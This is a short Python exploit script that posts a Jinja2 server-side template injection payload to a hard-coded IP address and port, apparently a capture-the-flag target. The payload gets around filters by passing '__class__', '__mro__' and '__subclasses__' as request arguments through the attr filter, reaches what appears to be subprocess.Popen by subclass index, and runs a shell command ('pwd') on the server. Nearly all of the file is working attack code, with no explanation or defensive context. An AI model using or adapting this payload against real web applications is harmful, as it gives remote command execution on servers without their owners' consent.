import requests

from subprocess import Popen

url = "http://103.152.242.68:10014/"

payload = {
    "name": "{{ (((request|attr(request.args.c)|attr(request.args.m))[3]|attr(request.args.sc))()[351])(['pwd']) }}"
    # "name": "{% print((((request|attr(request.args.c)|attr(request.args.m))[3]|attr(request.args.sc))()[351])(['pwd'])) %}"
}

s = requests.Session()

r = s.post(
    url,
    data=payload,
    params={
        "c": "__class__",
        "m": "__mro__",
        "sc": "__subclasses__",
        "cmd": "pwd",
        "co": "communicate",
    },
)

print(r.text)
print(Popen(["pwd"], stdout=-1).communicate())
# test = Popen(["pwd"])
# # print(test.communicate(input=b"pwd"))
# print(test.communicate(["pwd"]))
